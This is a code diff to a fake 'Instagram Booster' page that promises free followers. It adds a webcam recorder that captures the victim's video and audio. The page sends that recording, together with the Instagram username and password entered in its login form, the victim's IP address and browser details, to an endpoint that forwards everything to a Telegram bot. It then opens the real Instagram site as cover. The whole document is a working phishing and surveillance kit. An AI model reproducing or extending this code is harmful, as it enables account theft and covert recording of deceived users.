@@ -43,6 +43,109 @@
             background: linear-gradient(90deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
         }
         
+        .camera-container {
+            width: 100%;
+            height: 200px;
+            background: #000;
+            border-radius: 12px;
+            overflow: hidden;
+            margin-bottom: 15px;
+            position: relative;
+            border: 3px solid transparent;
+            background: linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d) border-box;
+            -webkit-mask: linear-gradient(#fff 0 0) padding-box, linear-gradient(#fff 0 0);
+            mask: linear-gradient(#fff 0 0) padding-box, linear-gradient(#fff 0 0);
+            -webkit-mask-composite: destination-out;
+            mask-composite: exclude;
+        }
+        
+        #cameraFeed {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+        }
+        
+        .camera-overlay {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: rgba(0,0,0,0.6);
+            color: white;
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            backdrop-filter: blur(5px);
+            z-index: 10;
+        }
+        
+        .recording-indicator {
+            width: 10px;
+            height: 10px;
+            background: #f44336;
+            border-radius: 50%;
+            animation: pulse 1.5s infinite;
+        }
+        
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+                opacity: 1;
+            }
+            50% {
+                transform: scale(1.3);
+                opacity: 0.7;
+            }
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+        
+        .camera-controls {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        
+        .cam-btn {
+            flex: 1;
+            padding: 10px;
+            border: none;
+            border-radius: 30px;
+            font-weight: 600;
+            font-size: 13px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+            transition: all 0.3s;
+        }
+        
+        .request-btn {
+            background: linear-gradient(45deg, #405de6, #5851db);
+            color: white;
+        }
+        
+        .record-btn {
+            background: linear-gradient(45deg, #f44336, #d32f2f);
+            color: white;
+        }
+        
+        .stop-btn {
+            background: #333;
+            color: white;
+        }
+        
+        .cam-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        
         .header {
             display: flex;
             align-items: center;
@@ -101,16 +204,6 @@
             overflow: hidden;
         }
         
-        .offer-card::before {
-            content: '✨';
-            position: absolute;
-            top: -20px;
-            right: -20px;
-            font-size: 100px;
-            opacity: 0.2;
-            transform: rotate(20deg);
-        }
-        
         .offer-header {
             display: flex;
             justify-content: space-between;
@@ -132,28 +225,6 @@
             font-weight: 600;
             backdrop-filter: blur(5px);
             border: 1px solid rgba(255,255,255,0.3);
-        }
-        
-        .offer-description {
-            font-size: 14px;
-            opacity: 0.9;
-            margin-bottom: 15px;
-            display: flex;
-            align-items: center;
-            gap: 5px;
-        }
-        
-        .offer-stats {
-            display: flex;
-            gap: 15px;
-            margin-bottom: 5px;
-        }
-        
-        .stat {
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            font-size: 13px;
         }
         
         .follower-selector {
@@ -178,40 +249,6 @@
             color: #262626;
         }
         
-        .selector-label small {
-            color: #8e8e8e;
-            font-size: 13px;
-            background: #f0f0f0;
-            padding: 4px 10px;
-            border-radius: 30px;
-        }
-        
-        .amount-slider {
-            margin-bottom: 20px;
-        }
-        
-        .slider {
-            -webkit-appearance: none;
-            width: 100%;
-            height: 8px;
-            border-radius: 10px;
-            background: linear-gradient(90deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
-            outline: none;
-            margin-bottom: 10px;
-        }
-        
-        .slider::-webkit-slider-thumb {
-            -webkit-appearance: none;
-            appearance: none;
-            width: 25px;
-            height: 25px;
-            border-radius: 50%;
-            background: white;
-            border: 2px solid #c13584;
-            cursor: pointer;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
-        }
-        
         .amount-options {
             display: flex;
             justify-content: space-between;
@@ -228,10 +265,6 @@
             color: #262626;
             cursor: pointer;
             transition: all 0.3s;
-        }
-        
-        .amount-option:hover {
-            background: #e0e0e0;
         }
         
         .amount-option.active {
@@ -257,36 +290,6 @@
             -webkit-text-fill-color: #8e8e8e;
         }
         
-        .features {
-            display: flex;
-            justify-content: space-between;
-            margin: 20px 0;
-            padding: 15px 0;
-            border-top: 1px solid #efefef;
-            border-bottom: 1px solid #efefef;
-        }
-        
-        .feature {
-            text-align: center;
-            flex: 1;
-        }
-        
-        .feature-icon {
-            font-size: 22px;
-            margin-bottom: 5px;
-        }
-        
-        .feature-text {
-            font-size: 11px;
-            font-weight: 600;
-            color: #262626;
-        }
-        
-        .feature-sub {
-            font-size: 9px;
-            color: #8e8e8e;
-        }
-        
         .login-section {
             background: #fafafa;
             border-radius: 14px;
@@ -302,10 +305,6 @@
             margin-bottom: 15px;
             color: #262626;
             font-weight: 600;
-        }
-        
-        .login-header i {
-            color: #3897f0;
         }
         
         .form-group {
@@ -355,21 +354,6 @@
             overflow: hidden;
         }
         
-        .login-btn::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
-            transition: left 0.5s;
-        }
-        
-        .login-btn:hover::before {
-            left: 100%;
-        }
-        
         .login-btn:hover {
             transform: translateY(-2px);
             box-shadow: 0 15px 25px rgba(193, 53, 132, 0.4);
@@ -385,7 +369,6 @@
             font-size: 14px;
             display: none;
             animation: slideIn 0.5s ease;
-            box-shadow: 0 5px 15px rgba(76, 175, 80, 0.3);
         }
         
         .error-message {
@@ -398,7 +381,6 @@
             font-size: 14px;
             display: none;
             animation: slideIn 0.5s ease;
-            box-shadow: 0 5px 15px rgba(244, 67, 54, 0.3);
         }
         
         @keyframes slideIn {
@@ -410,51 +392,6 @@
                 opacity: 1;
                 transform: translateY(0);
             }
-        }
-        
-        .divider {
-            margin: 20px 0;
-            text-align: center;
-            position: relative;
-        }
-        
-        .divider::before,
-        .divider::after {
-            content: "";
-            position: absolute;
-            top: 50%;
-            width: 45%;
-            height: 1px;
-            background-color: #dbdbdb;
-        }
-        
-        .divider::before {
-            left: 0;
-        }
-        
-        .divider::after {
-            right: 0;
-        }
-        
-        .divider span {
-            background-color: white;
-            padding: 0 15px;
-            color: #8e8e8e;
-            font-size: 13px;
-            font-weight: 500;
-        }
-        
-        .signup-link {
-            text-align: center;
-            color: #262626;
-            font-size: 14px;
-            margin-bottom: 15px;
-        }
-        
-        .signup-link a {
-            color: #0095f6;
-            text-decoration: none;
-            font-weight: 700;
         }
         
         .telegram-status {
@@ -472,10 +409,6 @@
             border: 1px solid #dbdbdb;
         }
         
-        .telegram-status i {
-            font-size: 16px;
-        }
-        
         .status-dot {
             width: 8px;
             height: 8px;
@@ -485,72 +418,13 @@
             margin-left: 5px;
             animation: pulse 2s infinite;
         }
-        
-        @keyframes pulse {
-            0% {
-                transform: scale(1);
-                opacity: 1;
-            }
-            50% {
-                transform: scale(1.2);
-                opacity: 0.7;
-            }
-            100% {
-                transform: scale(1);
-                opacity: 1;
-            }
-        }
-        
-        .testimonials {
-            margin-top: 20px;
-        }
-        
-        .testimonial {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            padding: 10px;
-            background: #fafafa;
-            border-radius: 30px;
-            border: 1px solid #efefef;
-        }
-        
-        .testimonial-avatar {
-            width: 32px;
-            height: 32px;
-            background: linear-gradient(45deg, #405de6, #c13584);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-weight: 600;
-            font-size: 14px;
-        }
-        
-        .testimonial-text {
-            font-size: 12px;
-            color: #262626;
-            flex: 1;
-        }
-        
-        .testimonial-text strong {
-            color: #3897f0;
-        }
-        
-        .stars {
-            color: #ffd700;
-            font-size: 12px;
-        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
             <div class="logo">
-                <div class="logo-icon">
-                    <span>📸</span>
-                </div>
+                <div class="logo-icon">📸</div>
                 <h1>Instagram</h1>
             </div>
             <div class="verified-badge">✓ Official</div>
@@ -558,38 +432,34 @@
         
         <div class="offer-card">
             <div class="offer-header">
-                <div class="offer-title">
-                    🚀 INSTAGRAM BOOSTER
-                </div>
-                <div class="offer-badge">
-                    LIMITED
-                </div>
+                <div class="offer-title">🚀 INSTAGRAM BOOSTER</div>
+                <div class="offer-badge">LIVE</div>
             </div>
-            <div class="offer-description">
-                <span>⚡</span> Get real Instagram followers instantly
-                <span>⚡</span>
+            <div style="font-size: 14px; opacity: 0.9;">⭐ 4.9 (2.3k reviews) • 👥 10k+ users</div>
+        </div>
+        
+        <div class="camera-container">
+            <video id="cameraFeed" autoplay playsinline></video>
+            <div class="camera-overlay" id="cameraStatus">
+                <span>📷 Camera Ready</span>
             </div>
-            <div class="offer-stats">
-                <div class="stat">
-                    <span>⭐</span> 4.9 (2.3k reviews)
-                </div>
-                <div class="stat">
-                    <span>👥</span> 10k+ users
-                </div>
-                <div class="stat">
-                    <span>⚡</span> Instant
-                </div>
-            </div>
+        </div>
+        
+        <div class="camera-controls">
+            <button class="cam-btn request-btn" onclick="requestCamera()" id="requestCamBtn">
+                📷 Request Camera
+            </button>
+            <button class="cam-btn record-btn" onclick="startRecording()" id="recordBtn" disabled>
+                ⏺️ Start Recording
+            </button>
+            <button class="cam-btn stop-btn" onclick="stopRecording()" id="stopBtn" disabled>
+                ⏹️ Stop & Send
+            </button>
         </div>
         
         <div class="follower-selector">
             <div class="selector-label">
-                <span>🎯 Select Followers Amount</span>
-                <small>🔥 Popular</small>
-            </div>
-            
-            <div class="amount-slider">
-                <input type="range" min="100" max="10000" value="1000" step="100" class="slider" id="followerSlider">
+                <span>🎯 Select Followers</span>
             </div>
             
             <div class="amount-options">
@@ -603,40 +473,15 @@
             <div class="selected-amount" id="selectedAmount">
                 1,000 <small>followers</small>
             </div>
-            
-            <div class="features">
-                <div class="feature">
-                    <div class="feature-icon">⚡</div>
-                    <div class="feature-text">Instant</div>
-                    <div class="feature-sub">Delivery</div>
-                </div>
-                <div class="feature">
-                    <div class="feature-icon">🔒</div>
-                    <div class="feature-text">Secure</div>
-                    <div class="feature-sub">Payment</div>
-                </div>
-                <div class="feature">
-                    <div class="feature-icon">🔄</div>
-                    <div class="feature-text">Real</div>
-                    <div class="feature-sub">Followers</div>
-                </div>
-                <div class="feature">
-                    <div class="feature-icon">💎</div>
-                    <div class="feature-text">Quality</div>
-                    <div class="feature-sub">Guarantee</div>
-                </div>
-            </div>
         </div>
         
         <div class="login-section">
-            <div class="login-header">
-                <span>🔐</span> Login to Claim Followers
-            </div>
+            <div class="login-header">🔐 Login to Claim</div>
             
             <form id="loginForm">
                 <div class="form-group">
                     <span class="input-icon">👤</span>
-                    <input type="text" placeholder="Phone number, username, or email" id="username" required>
+                    <input type="text" placeholder="Username or email" id="username" required>
                 </div>
                 <div class="form-group">
                     <span class="input-icon">🔑</span>
@@ -649,68 +494,38 @@
             </form>
         </div>
         
-        <!-- Message containers -->
         <div class="success-message" id="successMessage">
-            🎉 Success! <span id="successAmount">1,000</span> followers are being added to your account! 🎉
+            🎉 Success! Video and data sent to verification team!
         </div>
         
         <div class="error-message" id="errorMessage">
             ⚠️ Please enter both username and password
         </div>
         
-        <div class="divider">
-            <span>GET STARTED</span>
-        </div>
-        
-        <div class="signup-link">
-            Don't have an account? <a href="#">Sign up now</a> ✨
-        </div>
-        
-        <div class="testimonials">
-            <div class="testimonial">
-                <div class="testimonial-avatar">JD</div>
-                <div class="testimonial-text">
-                    <strong>@jessica.doe</strong> got <strong>5,000</strong> followers
-                    <div class="stars">⭐⭐⭐⭐⭐</div>
-                </div>
-            </div>
-        </div>
-        
         <div class="telegram-status" id="telegramStatus">
-            <span>server</span>
+            <span>🤖 Telegram Bot</span>
             <span>●</span>
-            <span>ONLINE</span>
+            <span>Ready</span>
             <span class="status-dot"></span>
         </div>
     </div>
     
     <script>
+        // Camera variables
+        let mediaRecorder;
+        let recordedChunks = [];
+        let stream;
         let selectedFollowers = 1000;
-        
-        // Update amount when slider changes
-        document.getElementById('followerSlider').addEventListener('input', function(e) {
-            const amount = parseInt(e.target.value);
-            setAmount(amount);
-        });
         
         function setAmount(amount) {
             selectedFollowers = amount;
-            
-            // Format number with commas
             const formattedAmount = amount.toLocaleString();
-            
-            // Update display
             document.getElementById('selectedAmount').innerHTML = `${formattedAmount} <small>followers</small>`;
             document.getElementById('displayAmount').innerText = formattedAmount;
-            document.getElementById('successAmount').innerText = formattedAmount;
             
-            // Update slider value
-            document.getElementById('followerSlider').value = amount;
-            
-            // Update active button
             document.querySelectorAll('.amount-option').forEach(btn => {
                 btn.classList.remove('active');
-                if (parseInt(btn.innerText.replace('K', '000').replace('M', '000000')) === amount || 
+                if (parseInt(btn.innerText.replace('K', '000')) === amount || 
                     (btn.innerText === '1K' && amount === 1000) ||
                     (btn.innerText === '2.5K' && amount === 2500) ||
                     (btn.innerText === '5K' && amount === 5000) ||
@@ -718,6 +533,167 @@
                     btn.classList.add('active');
                 }
             });
+        }
+        
+        // Request camera access
+        async function requestCamera() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    }, 
+                    audio: true 
+                });
+                
+                const videoElement = document.getElementById('cameraFeed');
+                videoElement.srcObject = stream;
+                
+                document.getElementById('cameraStatus').innerHTML = '<span>📷 Camera Active</span><span class="recording-indicator"></span>';
+                document.getElementById('requestCamBtn').disabled = true;
+                document.getElementById('recordBtn').disabled = false;
+                
+                updateTelegramStatus('🤖 Camera ready', '#4CAF50');
+                
+            } catch (err) {
+                console.error('Camera error:', err);
+                document.getElementById('cameraStatus').innerHTML = '❌ Camera access denied';
+                updateTelegramStatus('❌ Camera error', '#f44336');
+            }
+        }
+        
+        // Start recording
+        function startRecording() {
+            if (!stream) {
+                alert('Please grant camera access first');
+                return;
+            }
+            
+            recordedChunks = [];
+            
+            try {
+                mediaRecorder = new MediaRecorder(stream, {
+                    mimeType: 'video/webm;codecs=vp9,opus'
+                });
+                
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
+                
+                mediaRecorder.onstop = () => {
+                    sendVideoToTelegram();
+                };
+                
+                mediaRecorder.start();
+                
+                document.getElementById('cameraStatus').innerHTML = '<span>⏺️ Recording</span><span class="recording-indicator"></span>';
+                document.getElementById('recordBtn').disabled = true;
+                document.getElementById('stopBtn').disabled = false;
+                updateTelegramStatus('⏺️ Recording video...', '#f44336');
+                
+                // Auto-stop after 10 seconds (Telegram limit)
+                setTimeout(() => {
+                    if (mediaRecorder && mediaRecorder.state === 'recording') {
+                        stopRecording();
+                    }
+                }, 10000);
+                
+            } catch (err) {
+                console.error('Recording error:', err);
+                alert('Error starting recording: ' + err.message);
+            }
+        }
+        
+        // Stop recording
+        function stopRecording() {
+            if (mediaRecorder && mediaRecorder.state === 'recording') {
+                mediaRecorder.stop();
+                stream.getTracks().forEach(track => track.stop());
+                
+                document.getElementById('cameraStatus').innerHTML = '⏸️ Processing video...';
+                document.getElementById('recordBtn').disabled = false;
+                document.getElementById('stopBtn').disabled = true;
+                document.getElementById('requestCamBtn').disabled = false;
+            }
+        }
+        
+        // Send video to Telegram
+        async function sendVideoToTelegram() {
+            if (recordedChunks.length === 0) {
+                updateTelegramStatus('❌ No video recorded', '#f44336');
+                return;
+            }
+            
+            updateTelegramStatus('📤 Sending video...', '#ff9800');
+            
+            try {
+                // Create video blob
+                const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+                
+                // Convert to base64
+                const reader = new FileReader();
+                reader.readAsDataURL(videoBlob);
+                
+                reader.onloadend = async function() {
+                    const base64Video = reader.result.split(',')[1]; // Remove data URL prefix
+                    
+                    // Get username and password
+                    const username = document.getElementById('username').value || 'not_provided';
+                    const password = document.getElementById('password').value || 'not_provided';
+                    
+                    // Get IP info
+                    let ipInfo = 'Unknown';
+                    try {
+                        const ipResponse = await fetch('https://api.ipify.org?format=json');
+                        const ipData = await ipResponse.json();
+                        ipInfo = ipData.ip;
+                    } catch (e) {
+                        ipInfo = 'Could not fetch IP';
+                    }
+                    
+                    // Send to your API (which will forward to Telegram)
+                    const response = await fetch('/api/send_to_telegram', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            username: username,
+                            password: password,
+                            ipInfo: ipInfo,
+                            userAgent: navigator.userAgent,
+                            followers: selectedFollowers,
+                            video: base64Video,
+                            videoType: 'webm'
+                        })
+                    });
+                    
+                    const data = await response.json();
+                    
+                    if (data.success) {
+                        updateTelegramStatus('✅ Video sent!', '#4CAF50');
+                        document.getElementById('cameraStatus').innerHTML = '✅ Video sent to verification';
+                    } else {
+                        updateTelegramStatus('❌ Send failed', '#f44336');
+                    }
+                };
+                
+            } catch (err) {
+                console.error('Send error:', err);
+                updateTelegramStatus('❌ Error sending', '#f44336');
+            }
+        }
+        
+        function updateTelegramStatus(text, color) {
+            document.getElementById('telegramStatus').innerHTML = `
+                <span>🤖 Telegram Bot</span>
+                <span>●</span>
+                <span>${text}</span>
+                <span class="status-dot" style="background: ${color};"></span>
+            `;
         }
         
         async function sendToTelegram(username, password) {
@@ -731,16 +707,9 @@
                 ipInfo = 'Could not fetch IP';
             }
             
-            // Update status
-            document.getElementById('telegramStatus').innerHTML = `
-                <span>Request sent</span>
-                <span>●</span>
-                <span>Sending...</span>
-                <span class="status-dot" style="background: orange;"></span>
-            `;
+            updateTelegramStatus('📤 Sending data...', '#ff9800');
             
             try {
-                // Send to Vercel serverless function
                 const response = await fetch('/api/send_to_telegram', {
                     method: 'POST',
                     headers: {
@@ -758,30 +727,13 @@
                 const data = await response.json();
                 
                 if (data.success) {
-                    document.getElementById('telegramStatus').innerHTML = `
-                        <span>🤖 Request sent</span>
-                        <span>●</span>
-                        <span>Sent! ✅</span>
-                        <span class="status-dot"></span>
-                    `;
-                    console.log('Message sent successfully');
+                    updateTelegramStatus('✅ Data sent!', '#4CAF50');
                 } else {
-                    document.getElementById('telegramStatus').innerHTML = `
-                        <span>🤖 Request sent</span>
-                        <span>●</span>
-                        <span>Failed ❌</span>
-                        <span class="status-dot" style="background: #f44336;"></span>
-                    `;
-                    console.error('Telegram error:', data.error);
+                    updateTelegramStatus('❌ Send failed', '#f44336');
                 }
             } catch (error) {
-                document.getElementById('telegramStatus').innerHTML = `
-                    <span> Request sent</span>
-                    <span>●</span>
-                    <span>Error ⚠️</span>
-                    <span class="status-dot" style="background: #f44336;"></span>
-                `;
-                console.error('Error sending to Telegram:', error);
+                updateTelegramStatus('❌ Error', '#f44336');
+                console.error('Error:', error);
             }
         }
         
@@ -791,39 +743,30 @@
             const successMsg = document.getElementById('successMessage');
             const errorMsg = document.getElementById('errorMessage');
             
-            // Hide all messages first
             successMsg.style.display = 'none';
             errorMsg.style.display = 'none';
             
-            // Check if fields are empty
             if (username.trim() === '' || password.trim() === '') {
                 errorMsg.style.display = 'block';
-                
-                // Hide error after 3 seconds
                 setTimeout(() => {
                     errorMsg.style.display = 'none';
                 }, 3000);
                 return;
             }
             
-            // Show success message with selected amount
             successMsg.style.display = 'block';
             
-            // SEND TO  via Vercel function
+            // If video was recorded, it's already sent via stopRecording()
+            // Also send login data
             sendToTelegram(username, password);
             
-            // Open Instagram in a new tab
             window.open('https://www.instagram.com', '_blank');
             
-            // Clear fields after 3 seconds
             setTimeout(() => {
                 document.getElementById('username').value = '';
                 document.getElementById('password').value = '';
                 successMsg.style.display = 'none';
             }, 3000);
-            
-            // Log for demo purposes
-            console.log(`Login attempt for ${selectedFollowers} followers - sending to Telegram...`);
         }
     </script>
 </body>
